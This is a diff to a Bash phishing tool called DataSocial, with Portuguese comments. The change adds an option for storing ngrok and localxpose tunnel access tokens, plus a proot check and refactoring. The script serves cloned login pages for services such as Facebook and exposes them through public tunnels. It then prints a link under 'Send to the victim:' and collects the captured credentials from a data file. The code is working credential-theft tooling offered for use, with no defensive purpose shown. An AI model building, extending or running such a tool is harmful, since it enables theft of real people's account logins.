@@ -46,6 +46,8 @@
 #     Adicionado mais uma tela google e refatoração
 # v0.9 2023-9-15, Oliver Silva:
 #     Adicionado um proxy reverso localxspose
+# v1.0 2023-9-16, Oliver Silva:
+#     Adicionada opção de adicionar token de acesso de tunels
 #
 # Licença: MIT License
 #
@@ -58,15 +60,20 @@
 # Versão 0.7: Tratamento do prompt, bloqueio das teclas de atalho
 # Versão 0.8: Página do gooogle atualizada, refatoração.
 # Versão 0.9: Novo tunnel adicionado, refatoração.
+# Versão 1.0: Nova opção '--add-token' adicionada para vincular contas através do token de acesso.
 #
 
 trap interruptTwo SIGINT SIGTSTP
+
+
+### VARIÁVEIS ###
 
 host="localhost"
 port="5555"
 
 args=$@
 
+tokenAccessKey=0
 serviceKey=0
 listenKey=0
 tunnelKey=0
@@ -75,6 +82,20 @@ tunnelsLinks=(
     "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-${arch}.tgz"
     "https://api.localxpose.io/api/v2/downloads/loclx-linux-${arch}.zip"
 )
+
+
+### FUNÇÔES ###
+
+
+### Checa termux-chroot
+
+checkProot() {
+    if [ ! -d /etc/apt ] ; then
+	echo -e "\n\e[0mRun the program in proot or another type.\nExample : 'termux-chroot ./datasocial.sh $args'\e[0m."
+	interruptTwo
+    fi
+}
+
 
 ### Checa serviço
 
@@ -258,6 +279,34 @@ waitMessage() {
 }
 
 
+### Adiciona token de acesso 
+
+addTokenAccess() {
+    tokenName="$tokenAccess"
+
+    if [ ! -f ./tunnels/$tokenName ] ; then
+	echo -e "\e[0m[\033[31;1m!\e[0m] Tunnel does not exist $tokenName to add the access token"
+	exit
+
+    elif [ "$tokenName" == "ngrok" ] ; then
+	echo -e "\e[0m1 register at : \e[32;1mhttps://dashboard.ngrok.com/signup\e[0m"
+	echo -e "\e[0m2 Access your account at : \e[32;1mhttps://dashboard.ngrok.com/login\e[0m"
+	echo -e "\e[0m3 Copy the access token : \e[32;1mhttps://dashboard.ngrok.com/get-started/your-authtoken\e[0m"
+	echo -e "\nToken Access" ; read token
+
+	[ -z "$token" ] && addTokenAccess
+	./tunnels/ngrok config add-authtoken $token
+	exit
+
+    elif [ "$tokenName" == "loclx" ] ; then
+	echo -e "\e[0m1 register at : \e[32;1mhttps://localxpose.io/signup\e[0m"
+	echo -e "\e[0m2 Access your account at : \e[32;1mhttps://localxpose.io/login\e[0m"
+	echo -e "\e[0m3 Copy the access token : \e[32;1mhttps://localxpose.io/dashboard/access\e[0m"
+	./tunnels/loclx account login
+	exit
+    fi
+}
+
 ### tunnels
 
 tunnel() {
@@ -308,33 +357,30 @@ tunnel() {
 showLink() {
     checkReq && banner
     tunnel="$1"
-    warnning="\n\e[31;1m$1 Null!. run this program in another proot shell type or run this program again.\nCommand: 'termux-chroot ./dataSocial.sh $args'\e[0m"
     
     echo -e "\e[0m[!] Send to the victim:\e[0m"
 
     if [ "$tunnel" == "localhost" ] ; then
 	link="$(grep -o 'http://[-0-9a-z:]*' wait.log)"
-	
-	if [ -n "$link" ]; then
-	    echo -e "\e[0m[+] Localhost: \e[33;1m$link\e[0m"
 
-    	else
-	    echo -e "$warnning"
-	    interruptTwo
-	fi
+	if [ -n "$link" ] ; then
 	
+	    echo -e "\e[0m[+] Localhost: \e[33;1m$link\e[0m"
+	else
+	    echo -e "\e[31;1m$(grep -o "Error:.*" wait.log)\e[0m"
+	    
+	fi
 
     elif [ "$tunnel" == "ngrok" ] ; then
 	link="$(grep -o 'https://.[-0-9a-z]*.ngrok.io' wait.log)"
 
-	if [ -n "$link" ]; then
-	    echo -e "\e[0m[+] Ngrok: \e[33;1m$link\e[0m"
-
-    	else
-	    echo -e "$warnning"
-	    interruptTwo
-	fi
+	if [ -n "$link" ] ; then
 	
+	    echo -e "\e[0m[+] Ngrok: \e[33;1m$link\e[0m"
+	else
+	    echo -e "\e[31;1m$(grep -o "Error:.*" wait.log)\e[0m"
+	    
+	fi
 
     elif [ "$tunnel" == "ssh" ] ; then
 	echo -e "\e[0m[!] SSH: \e[33;1mserveo.net:$port\e[0m"
@@ -342,13 +388,14 @@ showLink() {
     elif [ "$tunnel" == "loclx" ] ; then
 	link="$(grep -o '[-0-9a-z.]*loclx.io' wait.log)"
 
-	if [ -n "$link" ]; then
+	if [ -n "$link" ] ; then
+	
 	    echo -e "\e[0m[+] Localxpose: \e[33;1m$link\e[0m"
-
-    	else
-	    echo -e "$warnning"
-	    interruptTwo
-	fi
+	else
+	    echo -e "\e[31;1m$(grep -o "Error:.*" wait.log)\e[0m" 
+	    
+	fi      
+	
     fi
 }
 
@@ -367,7 +414,7 @@ get_ip() {
 }
 
 
-### Mpstra os dados de acesso
+### Mostra os dados de acesso
 
 get_data() {
     while [ ! -f ./www/src/dados.txt ] ; do 
@@ -416,7 +463,7 @@ getDataCaptured() {
 }
 
 
-
+### Banner
 
 banner() {
 echo -e "\e[34m
@@ -436,10 +483,16 @@ echo -e "\e[34m
 \e[0m"
 }
 
+
+### Ajuda
+
 helper() {
-    echo -e "Uso: $(basename "$0") [OPÇÔES]\n\t-h, --help\tShow  this help screen and exit\n\t-v, --version\tShows the current version of the program\n\t-S, --services\tShow all services\n\t-T, --tunnels\tShow all tunnels\n\t-s, --service\tUse a service\n\t-l, --listen\tEnable listenning on localhost\n\t-t, --tunnel\tDefines a tunnel\n\t-i, \n\t--interactive\tStart the program in interactive mode\n\nExamples:\n\nLocalhost:\n\t${0} --service facebook --listen\nTunnel:\n\t${0} --service facebook --listen --tunnel ngrok"
+    echo -e "Uso: $(basename "$0") [OPÇÔES]\n\t-h, --help\tShow  this help screen and exit\n\t-v, --version\tShows the current version of the program\n\t--add-token YOUR TOKEN\n\t\t\tAdd access token\n\t-S, --services\tShow all services\n\t-T, --tunnels\tShow all tunnels\n\t-s, --service\tUse a service\n\t-l, --listen\tEnable listenning on localhost\n\t-t, --tunnel\tDefines a tunnel\n\t-i, \n\t--interactive\tStart the program in interactive mode\n\nExamples:\n\nLocalhost:\n\t${0} --service facebook --listen\nTunnel:\n\t${0} --service facebook --listen --tunnel ngrok"
     exit 0
 }
+
+
+### Versão
 
 version() {
     echo -ne "$(basename "$0")"
@@ -447,7 +500,7 @@ version() {
 }
 
 
-# Percorre a uma lista
+### Percorre a uma lista
 
 
 list() {
@@ -463,9 +516,12 @@ list() {
     done
 }
 
-# Checa pacotes necessários
+
+### Checa pacotes necessários
+
+
 checkReq() {
-    listReq=("ssh" "tar" "php" "jq" "curl" "toilet" "figlet" "unzip")
+    listReq=("ssh" "tar" "php" "jq" "curl" "toilet" "figlet" "unzip" "proot")
 
     [ -d $PREFIX/bin ] && dir=$PREFIX/bin # Termux
     [ -d /usr/bin ] && dir=/usr/bin 	  # Proot, Chroot or others
@@ -485,6 +541,9 @@ checkReq() {
 }
 
 
+### Repetir o teste
+
+
 rerun() {
     echo -e "\e[0mRun that attack again? [y/n] : \e[0m" ; read
 
@@ -492,7 +551,7 @@ rerun() {
 	rerun
 
     elif [ -n "$REPLY" -a "$REPLY" == "y" -o "$REPLY" == "Y" ] ; then
-	interrupt > /dev/null && ./dataSocial.sh $args
+	interrupt > /dev/null && ./datasocial.sh $args
 
     elif [ -n "$REPLY" -a "$REPLY" == "n" -o "$REPLY" == "N" ] ; then
 	interrupt
@@ -503,14 +562,25 @@ rerun() {
     fi
 }
 
-# Modo interativo
+
+### Uso do Modo interativo
+
+
 usage_i() {
     echo -e "\n\n\t\e[0mCommand\t\tDescription\n\t-------\t\t-----------\n\t?\t\tHelp menu\n\tquit\t\tStop this program\n\tshow <?>\tIt shows services, tunnels, default options. Replace <?> with one of these 3 commands\n\tuse <?>\t\tUse services and etc. Replace <?> with one of these commands\n\tset <?>\t\tDefine tunnels and etc. Replace <?> with one of these commands\n\trun\t\trun the setup\n\n"
 }
 
+
+### Opçôes do modo interativo
+
+
 options_i() {
     echo -e "\n\e[0mModule options (service/${1:-No service}):\n\n\tName\tCurrent Setting\tRequire\tDescription\n\t----\t---------------\t-------\t-----------\n\tTunnel\t[${2:-No tunnel}]\t\tno\tAllow the tunnel\n\n"
 }
+
+
+### Menu modo interativo
+
 
 menu() {
 
@@ -694,6 +764,9 @@ menu() {
     exit 0
 }
 
+
+### Total de serviços
+
 total_services() {
     count=0
     for index in ./websites/*; do
@@ -703,22 +776,34 @@ total_services() {
     echo $count
 }
 
+
+### Banner modo interativo
+
+
 banner_two() {
 
     version=$(grep "^# Versão" "$0" | tail -1 | cut -d ":" -f 1 | tr -d \# | tr -d " a-zãV")
-    dateUpdate=$(grep "^# v.*" dataSocial.sh | cut -d , -f 1 | tr -d \# | tr -d "a-z." | cut -c5-15 | tail -1)
+    dateUpdate=$(grep "^# v.*" datasocial.sh | cut -d , -f 1 | tr -d \# | tr -d "a-z." | cut -c5-15 | tail -1)
 
     echo -e "\n\n"
-    toilet -f slant dataSocial --metal
+    toilet -f slant DataSocial --metal
 
     echo -e "\t\t--=[DataSocial Phishing\n\t+---**---==[Version :\e[31m$version\e[0m\n\t+---**---==[Codename :\e[31mLiving is not for the weak\e[0m\n\t+---**---==[Services : \e[32;2m$(total_services)\e[0m\n\t\t--=[Update Date : [\e[31m$dateUpdate\e[0m]"
     echo -e "\n\n"
 }
 
+
+### Modo interativo
+
 interactiveMode() {
+    checkProot
+    checkReq
     banner_two
     menu
 }
+
+
+### Verificação
 
 if [ -z "$1" ] ; then
     banner
@@ -727,11 +812,25 @@ if [ -z "$1" ] ; then
 fi
 
 
+### Tratamento de opçôes
+
 while [ -n "$1" ] ; do
     case "$1" in
 	-h | --help) helper;;
 	
 	-v | --version) version && exit 0;;
+
+	--add-token)
+	    shift
+	    
+	    if [ -z "$1" ] ; then
+		echo -e "\e[0m[\e[31;1m!\e[0m] Specify the tunnel name to add the access token\e[0m"
+		exit 1
+	    fi
+
+	    tokenAccess="$1"
+	    tokenAccessKey=1
+	    ;;
 	
 	-S | --services)
 	    list ./websites "services" && exit 0;;
@@ -766,7 +865,6 @@ while [ -n "$1" ] ; do
 	    ;;
 	
         -i | --interactive)
-	    checkReq
 	    interactiveMode;;
 
 	*)
@@ -775,14 +873,20 @@ while [ -n "$1" ] ; do
     shift
 done
 
-if [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 0 ] ; then
-    tunnel && getDataCaptured
+
+### Execução
+
+
+if [ "$tokenAccessKey" == 1 ] ; then
+    checkReq && checkProot && addTokenAccess
+    
+elif [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 0 ] ; then
+    checkReq && checkProot && tunnel && getDataCaptured
 
 elif [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 1 ] ; then
-    tunnel && getDataCaptured
+    checkReq && checkProot && tunnel && getDataCaptured
 
 else
-    checkReq
     echo -e "\e[0m[\e[31;1m!\e[0m] \e[0mError processing command, try: -h,--help for more details\e[0m"
     exit 1
 fi
